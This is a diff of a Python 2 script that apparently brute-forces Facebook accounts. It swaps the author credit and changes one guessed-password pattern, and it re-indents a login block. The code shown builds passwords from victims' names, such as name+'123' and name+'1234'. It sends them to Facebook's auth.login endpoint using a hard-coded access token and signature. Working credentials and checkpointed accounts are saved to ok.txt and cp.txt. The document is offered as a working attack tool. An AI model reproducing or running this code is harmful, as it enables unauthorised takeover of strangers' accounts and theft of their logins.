@@ -1,5 +1,5 @@
 #/usr/bin/python2
-#writen/coded/by/Uzairkhan
+#writen/coded/by/Rishukhan
 
 try:
 
@@ -713,7 +713,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7=name+"@12"
+		                                                    pass7=name+"1234"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
@@ -749,35 +749,35 @@ def menu_select():
 
 		                                                           pass8=name+"123"
 
-		                                                          q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+		                                                           q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
-		                                                          d=json.loads(q)
+		                                                           d=json.loads(q)
 
-		                                                          if 'www.facebook.com' in d['error_msg']:
+		                                                           if 'www.facebook.com' in d['error_msg']:
 
-		                                                              print("\x1b[1;91m[RISHU-CP] "+uid+" | "+pass8)
+		                                                               print("\x1b[1;91m[RISHU-CP] "+uid+" | "+pass8)
 
-		                                                              cp=open("cp.txt","a")
+		                                                               cp=open("cp.txt","a")
 
-		                                                              cp.write(uid+" | "+pass8+"\n")
+		                                                               cp.write(uid+" | "+pass8+"\n")
 
-		                                                              cp.close()
+		                                                               cp.close()
 
-		                                                              cps.append(uid)
+		                                                               cps.append(uid)
 
-		                                                          else:
+		                                                           else:
 
-		                                                              if 'access_token' in d:
+		                                                               if 'access_token' in d:
 
-		                                                                  print("\x1b[1;92m[RISHU-OK] "+uid+" | "+pass8+"\x1b[1;0m")
+		                                                                   print("\x1b[1;92m[RISHU-OK] "+uid+" | "+pass8+"\x1b[1;0m")
 
-		                                                                  ok=open("ok.txt","a")
+		                                                                   ok=open("ok.txt","a")
 
-		                                                                  ok.write(uid+" | "+pass8+"\n")
+		                                                                   ok.write(uid+" | "+pass8+"\n")
 
-		                                                                  ok.close()
+		                                                                   ok.close()
 
-		                                                                  oks.append(uid)
+		                                                                   oks.append(uid)
 
 
 
